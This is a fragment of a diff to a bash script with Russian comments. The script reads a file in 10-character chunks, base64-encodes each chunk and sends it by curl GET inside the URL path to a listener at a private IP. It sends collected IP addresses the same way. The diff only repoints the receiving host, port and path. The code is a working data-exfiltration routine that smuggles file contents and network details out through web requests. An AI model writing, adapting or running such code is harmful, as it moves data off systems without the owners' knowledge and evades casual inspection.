@@ -64,7 +64,7 @@ for ((i=0; i<file_length; i+=10)); do
     encoded_chunk=$(echo -n "$chunk" | base64)
     
     # URL для GET запроса с использованием $encoded_chunk
-    url="http://192.168.110.142:8080/gamal/$encoded_chunk"
+    url="http://192.168.110.138:5000/!$encoded_chunk"
     
     # Выполнение GET запроса
     curl -X GET "$url"
@@ -80,7 +80,7 @@ for ip in $all_ips; do
     encoded_ip=$(echo -n "$ip" | base64)
     
     # URL для GET запроса с использованием закодированного IP
-    url="http://192.168.110.142:8080/gamal/$ip"
+    url="http://192.168.110.138:5000/!$ip"
     
     # Выполнение GET запроса
     curl -X GET "$url"
